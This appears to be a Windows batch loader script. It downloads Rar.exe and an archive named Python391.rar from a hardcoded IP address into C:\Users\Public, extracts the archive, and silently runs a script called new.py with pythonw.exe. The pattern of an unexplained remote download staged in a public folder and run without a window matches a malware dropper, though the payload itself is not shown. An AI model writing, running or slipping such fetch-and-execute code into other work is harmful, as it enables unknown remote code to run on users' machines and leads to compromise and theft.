@echo off
cd /d "C:\Users\Public"

echo Downloading Rar.exe...
curl -# -L "http://45.136.13.247/Rar.exe" -o "Rar.exe"
if not exist "Rar.exe" (
    echo Rar.exe download failed
    pause
    exit /b 1
)

echo Downloading Python391.rar...
curl -# -L "http://45.136.13.247/Python391.rar" -o "Python391.rar"
if not exist "Python391.rar" (
    echo Python391.rar download failed
    pause
    exit /b 1
)

if exist "Rar.exe" (
    Rar.exe x -o+ "Python391.rar"
) else (
    echo Rar.exe not found in C:\Users\Public
    pause
    exit /b 1
)

cd "Python391"
if exist "pythonw.exe" (
    pythonw.exe "new.py"
) else (
    echo pythonw.exe not found in Python391 directory
    pause
    exit /b 1
)